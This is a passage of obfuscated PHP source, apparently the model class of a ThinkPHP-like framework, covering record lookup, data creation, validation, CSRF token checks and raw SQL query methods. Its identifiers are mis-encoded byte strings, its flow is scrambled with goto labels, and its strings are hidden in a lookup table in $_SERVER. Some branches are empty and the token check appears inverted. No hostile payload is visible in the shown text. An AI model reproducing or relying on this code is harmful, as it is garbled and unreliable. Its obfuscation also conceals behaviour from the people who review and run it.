$this->getTableName(); $CÚ±òä¤Áã = $this->fields; } else { $CÚ±òä¤Áã = $this->getDbFields(); } if (!empty($f ù†ĞÙ“®[$eä‡¬‘Ó„[265]])) { $f ù†ĞÙ“®[$eä‡¬‘Ó„[264]] .= $eä‡¬‘Ó„[50] . $f ù†ĞÙ“®[$eä‡¬‘Ó„[265]]; } $f ù†ĞÙ“®[$eä‡¬‘Ó„[266]] = $this->name; goto CÌ‡ØÈ®äË; cíäæ‘ĞÎ: $eä‡¬‘Ó„ =& $_SERVER[ì‹É]; if (is_array($f ù†ĞÙ“®)) { $f ù†ĞÙ“® = array_merge($this->options, $f ù†ĞÙ“®); } $this->options = array(); goto b¨„ÏÛššÉ; ağÌâ™ğùÃ: } protected function _options_filter(&$FÍĞíº¡÷“) { } protected function _parseType(&$eÛ¾¬çšÂ, $E’Ò©“Ó†ì) { $aÊÅ¶§ÎŞ =& $_SERVER[ì‹É]; if (empty($this->options[$aÊÅ¶§ÎŞ[270]][$aÊÅ¶§ÎŞ[4] . $E’Ò©“Ó†ì])) { $e¬†â›‹„ = strtolower($this->fields[$aÊÅ¶§ÎŞ[237]][$E’Ò©“Ó†ì]); if (!1 !== strpos($e¬†â›‹„, $aÊÅ¶§ÎŞ[271])) { } elseif (!1 === strpos($e¬†â›‹„, $aÊÅ¶§ÎŞ[272]) && !1 !== strpos($e¬†â›‹„, $aÊÅ¶§ÎŞ[273])) { $eÛ¾¬çšÂ[$E’Ò©“Ó†ì] = intval($eÛ¾¬çšÂ[$E’Ò©“Ó†ì]); } elseif (!1 !== strpos($e¬†â›‹„, $aÊÅ¶§ÎŞ[274]) || !1 !== strpos($e¬†â›‹„, $aÊÅ¶§ÎŞ[275])) { $eÛ¾¬çšÂ[$E’Ò©“Ó†ì] = floatval($eÛ¾¬çšÂ[$E’Ò©“Ó†ì]); } elseif (!1 !== strpos($e¬†â›‹„, $aÊÅ¶§ÎŞ[276])) { $eÛ¾¬çšÂ[$E’Ò©“Ó†ì] = (bool) $eÛ¾¬çšÂ[$E’Ò©“Ó†ì]; } } } public function find($b‚Ïİ™˜¥› = array()) { goto e¤°î«›ôÔ; aùŸ¯ŠµŞ®: if (!empty($this->options[$f«™ôğ‘ë®[278]])) { return $this->returnResult($this->data, $this->options[$f«™ôğ‘ë®[278]]); } return $this->data; goto FñË™¹îÒã; e¤°î«›ôÔ: $f«™ôğ‘ë® =& $_SERVER[ì‹É]; if (is_numeric($b‚Ïİ™˜¥›) || is_string($b‚Ïİ™˜¥›)) { $F¶Á¥ÓøÎ[$this->getPk()] = $b‚Ïİ™˜¥›; $this->options[$f«™ôğ‘ë®[260]] = $F¶Á¥ÓøÎ; } $this->options[$f«™ôğ‘ë®[277]] = 1; goto EÄàÏì¤Å; EÄàÏì¤Å: $b‚Ïİ™˜¥› = $this->_parseOptions(); $a‰Çõº×”š = $this->db->select($b‚Ïİ™˜¥›); if (!1 === $a‰Çõº×”š) { return !1; } goto eË—‹íÛÕ†; eË—‹íÛÕ†: if (empty($a‰Çõº×”š)) { return null; } $this->data = $a‰Çõº×”š[0]; $this->_afterFind($this->data, $b‚Ïİ™˜¥›); goto aùŸ¯ŠµŞ®; FñË™¹îÒã: } protected function _afterFind(&$B ©‹ó¾ñ×, $EˆÁÍõ×í) { } protected function returnResult($F¯‡–‚•ÒÅ, $C…‡¬çˆ° = '') { $AÎêã°èò™ =& $_SERVER[ì‹É]; if ($C…‡¬çˆ°) { if (is_callable($C…‡¬çˆ°)) { return call_user_func($C…‡¬çˆ°, $F¯‡–‚•ÒÅ); } switch (strtolower($C…‡¬çˆ°)) { case $AÎêã°èò™[279]: return json_encode($F¯‡–‚•ÒÅ); case $AÎêã°èò™[280]: return xml_encode($F¯‡–‚•ÒÅ); } } return $F¯‡–‚•ÒÅ; } public function parseFieldsMap($aï¥ïâ½Ë», $BíŞ®ìœ÷À = 1) { if (!empty($this->_map)) { foreach ($this->_map as $E®î‡–ó»ù => $AÈÎÊ¨¤½) { if ($BíŞ®ìœ÷À == 1) { if (isset($aï¥ïâ½Ë»[$AÈÎÊ¨¤½])) { $aï¥ïâ½Ë»[$E®î‡–ó»ù] = $aï¥ïâ½Ë»[$AÈÎÊ¨¤½]; unset($aï¥ïâ½Ë»[$AÈÎÊ¨¤½]); } } else { if (isset($aï¥ïâ½Ë»[$E®î‡–ó»ù])) { $aï¥ïâ½Ë»[$AÈÎÊ¨¤½] = $aï¥ïâ½Ë»[$E®î‡–ó»ù]; unset($aï¥ïâ½Ë»[$E®î‡–ó»ù]); } } } } return $aï¥ïâ½Ë»; } public function setField($fò×Ô®ÖÃÜ, $e‘À‡µ¹ô¹ = '') { if (is_array($fò×Ô®ÖÃÜ)) { $F‹ƒÊø†¤„ = $fò×Ô®ÖÃÜ; } else { $F‹ƒÊø†¤„[$fò×Ô®ÖÃÜ] = $e‘À‡µ¹ô¹; } return $this->save($F‹ƒÊø†¤„); } public function setAdd($C¸Ñø‰¨‡¿, $A–°½£ÓŠ = 1) { $aÁ½ñåÔï‹ =& $_SERVER[ì‹É]; $F•ÈåÅøõğ = $C¸Ñø‰¨‡¿ . $aÁ½ñåÔï‹[281] . $A–°½£ÓŠ; if ($A–°½£ÓŠ < 0) { $F•ÈåÅøõğ = $C¸Ñø‰¨‡¿ . $A–°½£ÓŠ; } return $this->setField($C¸Ñø‰¨‡¿, array($aÁ½ñåÔï‹[282], $F•ÈåÅøõğ)); } public function getField($CÎâŠ„ôå¼, $Aƒ°¨¢Ãô = null) { $EœÖŞ¦Ş›ê =& $_SERVER[ì‹É]; $F•÷¯µÂóš[$EœÖŞ¦Ş›ê[258]] = $CÎâŠ„ôå¼; $F•÷¯µÂóš = $this->_parseOptions($F•÷¯µÂóš); $CÎâŠ„ôå¼ = trim($CÎâŠ„ôå¼); if (strpos($CÎâŠ„ôå¼, $EœÖŞ¦Ş›ê[47])) { if (!isset($F•÷¯µÂóš[$EœÖŞ¦Ş›ê[277]])) { $F•÷¯µÂóš[$EœÖŞ¦Ş›ê[277]] = is_numeric($Aƒ°¨¢Ãô) ? $Aƒ°¨¢Ãô : $EœÖŞ¦Ş›ê[33]; } $dÊšÒ™ë˜Ê = $this->db->select($F•÷¯µÂóš); if (!empty($dÊšÒ™ë˜Ê)) { goto D•Å‘ºÜ†; b­Ó§ä‚äŠ: $CÙŠ‚ªãˆ = array_shift($CÎâŠ„ôå¼); $d‘†…šš¨Š = array(); $B‰©¤ª¿Ïğ = count($DÆŸ„ïÕ); goto bÒß‡ ®¶; D•Å‘ºÜ†: $DÆŸ„ïÕ = explode($EœÖŞ¦Ş›ê[47], $CÎâŠ„ôå¼); $CÎâŠ„ôå¼ = array_keys($dÊšÒ™ë˜Ê[0]); $bó”ö”£ƒ© = array_shift($CÎâŠ„ôå¼); goto b­Ó§ä‚äŠ; bÒß‡ ®¶: foreach ($dÊšÒ™ë˜Ê as $Aå›¿ˆÖéÖ) { $F¨ÒğÑôÈ = $Aå›¿ˆÖéÖ[$bó”ö”£ƒ©]; if (2 == $B‰©¤ª¿Ïğ) { $d‘†…šš¨Š[$F¨ÒğÑôÈ] = $Aå›¿ˆÖéÖ[$CÙŠ‚ªãˆ]; } else { $d‘†…šš¨Š[$F¨ÒğÑôÈ] = is_string($Aƒ°¨¢Ãô) ? implode($Aƒ°¨¢Ãô, $Aå›¿ˆÖéÖ) : $Aå›¿ˆÖéÖ; } } return $d‘†…šš¨Š; goto fáÖØ·¼“Ç; fáÖØ·¼“Ç: } } else { if (!0 !== $Aƒ°¨¢Ãô) { $F•÷¯µÂóš[$EœÖŞ¦Ş›ê[277]] = is_numeric($Aƒ°¨¢Ãô) ? $Aƒ°¨¢Ãô : 1; } if ($Aƒ°¨¢Ãô === $EœÖŞ¦Ş›ê[240]) { unset($F•÷¯µÂóš[$EœÖŞ¦Ş›ê[277]]); } $Aå›¿ˆÖéÖ = $this->db->select($F•÷¯µÂóš); if (!empty($Aå›¿ˆÖéÖ)) { if ($Aƒ°¨¢Ãô === $EœÖŞ¦Ş›ê[240]) { return reset($Aå›¿ˆÖéÖ[0]); } if (!0 !== $Aƒ°¨¢Ãô && 1 == $F•÷¯µÂóš[$EœÖŞ¦Ş›ê[277]]) { return reset($Aå›¿ˆÖéÖ[0]); } foreach ($Aå›¿ˆÖéÖ as $C‰ï‹Ÿî…) { $BÒÜ½×ª™[] = $C‰ï‹Ÿî…[$CÎâŠ„ôå¼]; } return $BÒÜ½×ª™; } } return null; } public function create($b½õ‡Àá¼… = '', $Bõ¶°šßŒÓ = '') { goto c†áÕÍ÷ÌÚ; D¾«Ÿğ¿Û: if ($this->autoCheckFields) { $eô¸Ò„µ› = $this->getDbFields(); foreach ($b½õ‡Àá¼… as $b£›íï«¥¼ => $fÅÕÚêŠÙÉ) { if (!in_array($b£›íï«¥¼, $eô¸Ò„µ›)) { unset($b½õ‡Àá¼…[$b£›íï«¥¼]); } elseif (MAGIC_QUOTES_GPC && is_string($fÅÕÚêŠÙÉ)) { $b½õ‡Àá¼…[$b£›íï«¥¼] = stripslashes($fÅÕÚêŠÙÉ); } } } $this->autoOperation($b½õ‡Àá¼…, $Bõ¶°šßŒÓ); $this->data = $b½õ‡Àá¼…; goto B·¾Şâ¸°„; B·¾Şâ¸°„: return $b½õ‡Àá¼…; goto b•ˆµ›™; EÂ˜Ïê½¦†: $b½õ‡Àá¼… = $this->parseFieldsMap($b½õ‡Àá¼…, 0); $Bõ¶°šßŒÓ = $Bõ¶°šßŒÓ ? $Bõ¶°šßŒÓ : (!empty($b½õ‡Àá¼…[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$aÒ¿Ä›¨Ü[258]])) { $eô¸Ò„µ› = $this->options[$aÒ¿Ä›¨Ü[258]]; unset($this->options[$aÒ¿Ä›¨Ü[258]]); } elseif ($Bõ¶°šßŒÓ == THINK_MODEL_INSERT && isset($this->insertFields)) { $eô¸Ò„µ› = $this->insertFields; } elseif ($Bõ¶°šßŒÓ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $eô¸Ò„µ› = $this->updateFields; } goto a•×âä¢ÀÇ; c†áÕÍ÷ÌÚ: $aÒ¿Ä›¨Ü =& $_SERVER[ì‹É]; if (empty($b½õ‡Àá¼…)) { $b½õ‡Àá¼… = $_POST; } elseif (is_object($b½õ‡Àá¼…)) { $b½õ‡Àá¼… = get_object_vars($b½õ‡Àá¼…); } if (empty($b½õ‡Àá¼…) || !is_array($b½õ‡Àá¼…)) { $this->error = think_lang($aÒ¿Ä›¨Ü[256]); return !1; } goto EÂ˜Ïê½¦†; a•×âä¢ÀÇ: if (isset($eô¸Ò„µ›)) { if (is_string($eô¸Ò„µ›)) { $eô¸Ò„µ› = explode($aÒ¿Ä›¨Ü[47], $eô¸Ò„µ›); } if (think_config($aÒ¿Ä›¨Ü[283])) { $eô¸Ò„µ›[] = think_config($aÒ¿Ä›¨Ü[284]); } foreach ($b½õ‡Àá¼… as $b£›íï«¥¼ => $fÅÕÚêŠÙÉ) { if (!in_array($b£›íï«¥¼, $eô¸Ò„µ›)) { unset($b½õ‡Àá¼…[$b£›íï«¥¼]); } } } if (!$this->autoValidation($b½õ‡Àá¼…, $Bõ¶°šßŒÓ)) { return !1; } if (!$this->autoCheckToken($b½õ‡Àá¼…)) { $this->error = think_lang($aÒ¿Ä›¨Ü[285]); return !1; } goto D¾«Ÿğ¿Û; b•ˆµ›™: } public function autoCheckToken($A§ÇÄ…¡„) { $a¦¹¡ìä»Ü =& $_SERVER[ì‹É]; if (isset($this->options[$a¦¹¡ìä»Ü[286]]) && !$this->options[$a¦¹¡ìä»Ü[286]]) { return !0; } if (think_config($a¦¹¡ìä»Ü[283])) { $cä•ô¨ò©Ù = think_config($a¦¹¡ìä»Ü[284]); if (!isset($A§ÇÄ…¡„[$cä•ô¨ò©Ù]) || Session::get($cä•ô¨ò©Ù)) { return !1; } list($F¥ÙÁÛÄ’, $F×ÎƒÎ‹ï) = explode($a¦¹¡ìä»Ü[71], $A§ÇÄ…¡„[$cä•ô¨ò©Ù]); if ($F×ÎƒÎ‹ï && Session::get($cä•ô¨ò©Ù . $a¦¹¡ìä»Ü[94] . $F¥ÙÁÛÄ’) === $F×ÎƒÎ‹ï) { Session::remove($cä•ô¨ò©Ù . $a¦¹¡ìä»Ü[94] . $F¥ÙÁÛÄ’); return !0; } if (think_config($a¦¹¡ìä»Ü[287])) { Session::remove($cä•ô¨ò©Ù . $a¦¹¡ìä»Ü[94] . $F¥ÙÁÛÄ’); } return !1; } return !0; } public function regex($Cø¬ˆÛíŠ, $a”šºƒÒ) { $eÁ›Ø£™â± =& $_SERVER[ì‹É]; $EË†Ì‘òÜ© = array($eÁ›Ø£™â±[288] => $eÁ›Ø£™â±[289], $eÁ›Ø£™â±[290] => $eÁ›Ø£™â±[291], $eÁ›Ø£™â±[292] => $eÁ›Ø£™â±[293], $eÁ›Ø£™â±[294] => $eÁ›Ø£™â±[295], $eÁ›Ø£™â±[296] => $eÁ›Ø£™â±[297], $eÁ›Ø£™â±[298] => $eÁ›Ø£™â±[299], $eÁ›Ø£™â±[300] => $eÁ›Ø£™â±[301], $eÁ›Ø£™â±[275] => $eÁ›Ø£™â±[302], $eÁ›Ø£™â±[303] => $eÁ›Ø£™â±[304]); if (isset($EË†Ì‘òÜ©[strtolower($a”šºƒÒ)])) { $a”šºƒÒ = $EË†Ì‘òÜ©[strtolower($a”šºƒÒ)]; } return preg_match($a”šºƒÒ, $Cø¬ˆÛíŠ) === 1; } private function autoOperation(&$CÏ¤ì´à¤½, $B‘¿êö´¤) { $D¨®™ô×‚› =& $_SERVER[ì‹É]; if (!empty($this->options[$D¨®™ô×‚›[305]])) { $AªíÌÕˆ¨ = $this->options[$D¨®™ô×‚›[305]]; unset($this->options[$D¨®™ô×‚›[305]]); } elseif (!empty($this->_auto)) { $AªíÌÕˆ¨ = $this->_auto; } if (isset($AªíÌÕˆ¨)) { foreach ($AªíÌÕˆ¨ as $dâšËÎœÄ©) { if (empty($dâšËÎœÄ©[2])) { $dâšËÎœÄ©[2] = THINK_MODEL_INSERT; } if ($B‘¿êö´¤ == $dâšËÎœÄ©[2] || $dâšËÎœÄ©[2] == THINK_MODEL_BOTH) { switch (trim($dâšËÎœÄ©[3])) { case $D¨®™ô×‚›[306]: case $D¨®™ô×‚›[307]: $eò½©ÒÔì = isset($dâšËÎœÄ©[4]) ? (array) $dâšËÎœÄ©[4] : array(); if (isset($CÏ¤ì´à¤½[$dâšËÎœÄ©[0]])) { array_unshift($eò½©ÒÔì, $CÏ¤ì´à¤½[$dâšËÎœÄ©[0]]); } if ($D¨®™ô×‚›[306] == $dâšËÎœÄ©[3]) { $CÏ¤ì´à¤½[$dâšËÎœÄ©[0]] = call_user_func_array($dâšËÎœÄ©[1], $eò½©ÒÔì); } else { $CÏ¤ì´à¤½[$dâšËÎœÄ©[0]] = call_user_func_array(array(&$this, $dâšËÎœÄ©[1]), $eò½©ÒÔì); } break; case $D¨®™ô×‚›[258]: $CÏ¤ì´à¤½[$dâšËÎœÄ©[0]] = $CÏ¤ì´à¤½[$dâšËÎœÄ©[1]]; break; case $D¨®™ô×‚›[308]: if ($D¨®™ô×‚›[33] === $CÏ¤ì´à¤½[$dâšËÎœÄ©[0]]) { unset($CÏ¤ì´à¤½[$dâšËÎœÄ©[0]]); } break; case $D¨®™ô×‚›[309]: default: $CÏ¤ì´à¤½[$dâšËÎœÄ©[0]] = $dâšËÎœÄ©[1]; } if (!1 === $CÏ¤ì´à¤½[$dâšËÎœÄ©[0]]) { unset($CÏ¤ì´à¤½[$dâšËÎœÄ©[0]]); } } } } return $CÏ¤ì´à¤½; } protected function autoValidation($DËãÎˆñÈ, $C¿ŸİÏÁß) { $FÉ‘íğàî =& $_SERVER[ì‹É]; if (!empty($this->options[$FÉ‘íğàî[310]])) { $b“ùÌïáÀ = $this->options[$FÉ‘íğàî[310]]; unset($this->options[$FÉ‘íğàî[310]]); } elseif (!empty($this->_validate)) { $b“ùÌïáÀ = $this->_validate; } if (isset($b“ùÌïáÀ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($b“ùÌïáÀ as $EÚ²çº¬Ÿ” => $a’ĞãÈÂÖ°) { if (empty($a’ĞãÈÂÖ°[5]) || $a’ĞãÈÂÖ°[5] == THINK_MODEL_BOTH || $a’ĞãÈÂÖ°[5] == $C¿ŸİÏÁß) { if (0 == strpos($a’ĞãÈÂÖ°[2], $FÉ‘íğàî[311]) && strpos($a’ĞãÈÂÖ°[2], $FÉ‘íğàî[312])) { $a’ĞãÈÂÖ°[2] = think_lang(substr($a’ĞãÈÂÖ°[2], 2, -1)); } $a’ĞãÈÂÖ°[3] = isset($a’ĞãÈÂÖ°[3]) ? $a’ĞãÈÂÖ°[3] : THINK_EXISTS_VALIDATE; $a’ĞãÈÂÖ°[4] = isset($a’ĞãÈÂÖ°[4]) ? $a’ĞãÈÂÖ°[4] : $FÉ‘íğàî[313]; switch ($a’ĞãÈÂÖ°[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($DËãÎˆñÈ, $a’ĞãÈÂÖ°)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($FÉ‘íğàî[33] != trim($DËãÎˆñÈ[$a’ĞãÈÂÖ°[0]])) { if (!1 === $this->_validationField($DËãÎˆñÈ, $a’ĞãÈÂÖ°)) { return !1; } } break; default: if (isset($DËãÎˆñÈ[$a’ĞãÈÂÖ°[0]])) { if (!1 === $this->_validationField($DËãÎˆñÈ, $a’ĞãÈÂÖ°)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($DµÕÍ¤äÃØ, $eÓøŞˆª‹) { if (!1 === $this->_validationFieldItem($DµÕÍ¤äÃØ, $eÓøŞˆª‹)) { if ($this->patchValidate) { $this->error[$eÓøŞˆª‹[0]] = $eÓøŞˆª‹[2]; } else { $this->error = $eÓøŞˆª‹[2]; return !1; } } return; } protected function _validationFieldItem($e»ƒïÌ–°Š, $a ¦¥‘¤Õª) { $e†‚Ä¡ÒŠ =& $_SERVER[ì‹É]; switch (strtolower(trim($a ¦¥‘¤Õª[4]))) { case $e†‚Ä¡ÒŠ[306]: case $e†‚Ä¡ÒŠ[307]: $E³ññ˜ôë® = isset($a ¦¥‘¤Õª[6]) ? (array) $a ¦¥‘¤Õª[6] : array(); if (is_string($a ¦¥‘¤Õª[0]) && strpos($a ¦¥‘¤Õª[0], $e†‚Ä¡ÒŠ[47])) { $a ¦¥‘¤Õª[0] = explode($e†‚Ä¡ÒŠ[47], $a ¦¥‘¤Õª[0]); } if (is_array($a ¦¥‘¤Õª[0])) { foreach ($a ¦¥‘¤Õª[0] as $B±ŠˆÍÂİ) { $dá…÷‹ÓÎ•[$B±ŠˆÍÂİ] = $e»ƒïÌ–°Š[$B±ŠˆÍÂİ]; } array_unshift($E³ññ˜ôë®, $dá…÷‹ÓÎ•); } else { array_unshift($E³ññ˜ôë®, $e»ƒïÌ–°Š[$a ¦¥‘¤Õª[0]]); } if ($e†‚Ä¡ÒŠ[306] == $a ¦¥‘¤Õª[4]) { return call_user_func_array($a ¦¥‘¤Õª[1], $E³ññ˜ôë®); } else { return call_user_func_array(array(&$this, $a ¦¥‘¤Õª[1]), $E³ññ˜ôë®); } case $e†‚Ä¡ÒŠ[314]: return $e»ƒïÌ–°Š[$a ¦¥‘¤Õª[0]] == $e»ƒïÌ–°Š[$a ¦¥‘¤Õª[1]]; case $e†‚Ä¡ÒŠ[315]: if (is_string($a ¦¥‘¤Õª[0]) && strpos($a ¦¥‘¤Õª[0], $e†‚Ä¡ÒŠ[47])) { $a ¦¥‘¤Õª[0] = explode($e†‚Ä¡ÒŠ[47], $a ¦¥‘¤Õª[0]); } $EáÅ¬ÂÍ„ = array(); if (is_array($a ¦¥‘¤Õª[0])) { foreach ($a ¦¥‘¤Õª[0] as $B±ŠˆÍÂİ) { $EáÅ¬ÂÍ„[$B±ŠˆÍÂİ] = $e»ƒïÌ–°Š[$B±ŠˆÍÂİ]; } } else { $EáÅ¬ÂÍ„[$a ¦¥‘¤Õª[0]] = $e»ƒïÌ–°Š[$a ¦¥‘¤Õª[0]]; } if (!empty($e»ƒïÌ–°Š[$this->getPk()])) { $EáÅ¬ÂÍ„[$this->getPk()] = array($e†‚Ä¡ÒŠ[316], $e»ƒïÌ–°Š[$this->getPk()]); } if ($this->where($EáÅ¬ÂÍ„)->find()) { return !1; } return !0; default: return $this->check($e»ƒïÌ–°Š[$a ¦¥‘¤Õª[0]], $a ¦¥‘¤Õª[1], $a ¦¥‘¤Õª[4]); } } public function check($fÆæ˜¼°óÕ, $a‚œ¶œ¼Ô¬, $FµªÊÀ÷Öö = "\162\x65\147\145\170") { $fÛ–Çñ¹±ï =& $_SERVER[ì‹É]; $FµªÊÀ÷Öö = strtolower(trim($FµªÊÀ÷Öö)); switch ($FµªÊÀ÷Öö) { case $fÛ–Çñ¹±ï[7]: case $fÛ–Çñ¹±ï[317]: $Cƒ°«Ğ»Äà = is_array($a‚œ¶œ¼Ô¬) ? $a‚œ¶œ¼Ô¬ : explode($fÛ–Çñ¹±ï[47], $a‚œ¶œ¼Ô¬); return $FµªÊÀ÷Öö == $fÛ–Çñ¹±ï[7] ? in_array($fÆæ˜¼°óÕ, $Cƒ°«Ğ»Äà) : !in_array($fÆæ˜¼°óÕ, $Cƒ°«Ğ»Äà); case $fÛ–Çñ¹±ï[318]: case $fÛ–Çñ¹±ï[319]: if (is_array($a‚œ¶œ¼Ô¬)) { $f¯ëªÒßã = $a‚œ¶œ¼Ô¬[0]; $Cİ¢ŞÖµ—é = $a‚œ¶œ¼Ô¬[1]; } else { list($f¯ëªÒßã, $Cİ¢ŞÖµ—é) = explode($fÛ–Çñ¹±ï[47], $a‚œ¶œ¼Ô¬); } return $FµªÊÀ÷Öö == $fÛ–Çñ¹±ï[318] ? $fÆæ˜¼°óÕ >= $f¯ëªÒßã && $fÆæ˜¼°óÕ <= $Cİ¢ŞÖµ—é : $fÆæ˜¼°óÕ < $f¯ëªÒßã || $fÆæ˜¼°óÕ > $Cİ¢ŞÖµ—é; case $fÛ–Çñ¹±ï[320]: case $fÛ–Çñ¹±ï[321]: return $FµªÊÀ÷Öö == $fÛ–Çñ¹±ï[320] ? $fÆæ˜¼°óÕ == $a‚œ¶œ¼Ô¬ : $fÆæ˜¼°óÕ != $a‚œ¶œ¼Ô¬; case $fÛ–Çñ¹±ï[322]: $F§…æ‘Ì†ï = mb_strlen($fÆæ˜¼°óÕ, $fÛ–Çñ¹±ï[323]); if (strpos($a‚œ¶œ¼Ô¬, $fÛ–Çñ¹±ï[47])) { list($f¯ëªÒßã, $Cİ¢ŞÖµ—é) = explode($fÛ–Çñ¹±ï[47], $a‚œ¶œ¼Ô¬); return $F§…æ‘Ì†ï >= $f¯ëªÒßã && $F§…æ‘Ì†ï <= $Cİ¢ŞÖµ—é; } else { return $F§…æ‘Ì†ï == $a‚œ¶œ¼Ô¬; } case $fÛ–Çñ¹±ï[324]: list($bí”½Î¿Ú¼, $EÎŸ±–š°â) = explode($fÛ–Çñ¹±ï[47], $a‚œ¶œ¼Ô¬); if (!is_numeric($bí”½Î¿Ú¼)) { $bí”½Î¿Ú¼ = strtotime($bí”½Î¿Ú¼); } if (!is_numeric($EÎŸ±–š°â)) { $EÎŸ±–š°â = strtotime($EÎŸ±–š°â); } return NOW_TIME >= $bí”½Î¿Ú¼ && NOW_TIME <= $EÎŸ±–š°â; case $fÛ–Çñ¹±ï[325]: return in_array(get_client_ip(), explode($fÛ–Çñ¹±ï[47], $a‚œ¶œ¼Ô¬)); case $fÛ–Çñ¹±ï[326]: return !in_array(get_client_ip(), explode($fÛ–Çñ¹±ï[47], $a‚œ¶œ¼Ô¬)); case $fÛ–Çñ¹±ï[313]: default: return $this->regex($fÆæ˜¼°óÕ, $a‚œ¶œ¼Ô¬); } } public function query($Bâ¯æ²ø‰, $d¯äÊÏˆ¢ = false) { $bå¸Ñ¿ ‹¿ =& $_SERVER[ì‹É]; if (!is_bool($d¯äÊÏˆ¢) && !is_array($d¯äÊÏˆ¢)) { $d¯äÊÏˆ¢ = func_get_args(); array_shift($d¯äÊÏˆ¢); } $Bâ¯æ²ø‰ = str_replace(array($bå¸Ñ¿ ‹¿[214], $bå¸Ñ¿ ‹¿[327]), $bå¸Ñ¿ ‹¿[50], $Bâ¯æ²ø‰); $Bâ¯æ²ø‰ = $this->parseSql($Bâ¯æ²ø‰, $d¯äÊÏˆ¢); return $this->db->query($Bâ¯æ²ø‰); } public function execute($B´“êéºå·, $EÎ¢‹ÄìõŞ = false) { if (!is_bool($EÎ¢‹ÄìõŞ) && !is_array($EÎ¢‹ÄìõŞ)) { $EÎ¢‹ÄìõŞ = func_get_args(); array_shift($EÎ¢‹ÄìõŞ); } $B´“êéºå· = $this->parseSql($B´“êéºå·, $EÎ¢‹ÄìõŞ); return $this->db->execute($B´“êéºå·); } protected function parseSql($Eô¬…ïÁÍÏ, $DòÉğ‘îÖ) { $bŒ“…°÷Ê =& $_SERVER[ì‹É]; if (!0 === $DòÉğ‘îÖ) { $EÚé¾²È™š = $this->_parseOptions(); $Eô¬…ïÁÍÏ = $this->db->parseSql($Eô¬…ïÁÍÏ, $EÚé¾²È™š); } elseif (is_array($DòÉğ‘îÖ)) { $DòÉğ‘îÖ = array_map(array($this->db, $bŒ“…°÷Ê[328]), $DòÉğ‘îÖ); $Eô¬…ïÁÍÏ = vsprintf($Eô¬…ïÁÍÏ, $DòÉğ‘îÖ); } else { $Eô¬…ïÁÍÏ = strtr($Eô¬…ïÁÍÏ, array($bŒ“…°÷Ê[329] => $this->getTableName(), $bŒ“…°÷Ê[330] => think_config($bŒ“…°÷Ê[229]))); } $this->db->setModel($this->name); return $Eô¬…ïÁÍÏ; } public function db($cÃÏ“à×‰¢ = '', $BóïÌ¦Œù‹ = '', $BâğÆÚŒœÊ = array()) { goto A“ëÜšÚÌ; DÄ¬óŞ»â‡: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto C’ğøÈ¡ß™; f® Ï«‹: static $aê±œ´®Á¢ = array(); if (!isset($aê±œ´®Á¢[$cÃÏ“à×‰¢]) || isset($aê±œ´®Á¢[$cÃÏ“à×‰¢]) && $BóïÌ¦Œù‹ && $D¹¢’Ï…¯[$cÃÏ“à×‰¢] != $BóïÌ¦Œù‹) { if (!empty($BóïÌ¦Œù‹) && is_string($BóïÌ¦Œù‹) && !1 === strpos($BóïÌ¦Œù‹, $E…µù¥›Çó[8])) { $BóïÌ¦Œù‹ = think_config($BóïÌ¦Œù‹); } $aê±œ´®Á¢[$cÃÏ“à×‰¢] = Db::getInstance($BóïÌ¦Œù‹); } elseif (NULL === $BóïÌ¦Œù‹) { $aê±œ´®Á¢[$cÃÏ“à×‰¢]->close(); unset($aê±œ´®Á¢[$cÃÏ“à×‰¢]); return; } if (!empty($BâğÆÚŒœÊ)) { if (is_string($BâğÆÚŒœÊ)) { parse_str($BâğÆÚŒœÊ, $BâğÆÚŒœÊ); } foreach ($BâğÆÚŒœÊ as $D­µº¸ê´ => $B®„ÚàªÅ´) { $this->setProperty($D­µº¸ê´, $B®„ÚàªÅ´); } } goto e­Âï‹“¡¨; A“ëÜšÚÌ: $E…µù¥›Çó =& $_SERVER[ì‹É]; if ($E…µù¥›Çó[33] === $cÃÏ“à×‰¢ && $this->db) { return $this->db; } static $D¹¢’Ï…¯ = array(); goto f® Ï«‹; e­Âï‹“¡¨: $D¹¢’Ï…¯[$cÃÏ“à×‰¢] = $BóïÌ¦Œù‹; $this->db = $aê±œ´®Á¢[$cÃÏ“à×‰¢]; $this->_after_db(); goto DÄ¬óŞ»â‡; C’ğøÈ¡ß™: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $AÒ˜­èšã– = get_class($this); if ($AÒ˜­èšã– == $_SERVER[ì‹É][331]) { return $this->name; } $this->name = substr($AÒ˜­èšã–, 0, -5); } return $this->name; } public function getTableName() { $DÅŠ¾¤ÔŠğ =& $_SERVER[ì‹É]; if (empty($this->trueTableName)) { $f‘Ä‹Àó = !empty($this->tablePrefix) ? $this->tablePrefix : $DÅŠ¾¤ÔŠğ[33]; if (!empty($this->tableName)) { $f‘Ä‹Àó .= $this->tableName; } else { $f‘Ä‹Àó .= think_parse_name($this->name); } $this->trueTableName = strtolower($f‘Ä‹Àó); } return (!empty($this->dbName) ? $this->dbName . $DÅŠ¾¤ÔŠğ[94] : $DÅŠ¾¤ÔŠğ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $F×š¼ãà‘„ =& $_SERVER[ì‹É]; return isset($this->fields[$F×š¼ãà‘„[236]]) ? $this->fields[$F×š¼ãà‘„[236]] : $this->pk; } public function getDbFields() { $fè†õ•¿»„ =& $_SERVER[ì‹É]; if (isset($this->options[$fè†õ•¿»„[264]])) { $D¿Ğ«ŞÈÛ½ = $this->db->getFields($this->options[$fè†õ•¿»„[264]]); return $D¿Ğ«ŞÈÛ½ ? array_keys($D¿Ğ«ŞÈÛ½) : !1; } if ($this->fields) { $D¿Ğ«ŞÈÛ½ = $this->fields; unset($D¿Ğ«ŞÈÛ½[$fè†õ•¿»„[235]], $D¿Ğ«ŞÈÛ½[$fè†õ•¿»„[236]], $D¿Ğ«ŞÈÛ½[$fè†õ•¿»„[237]], 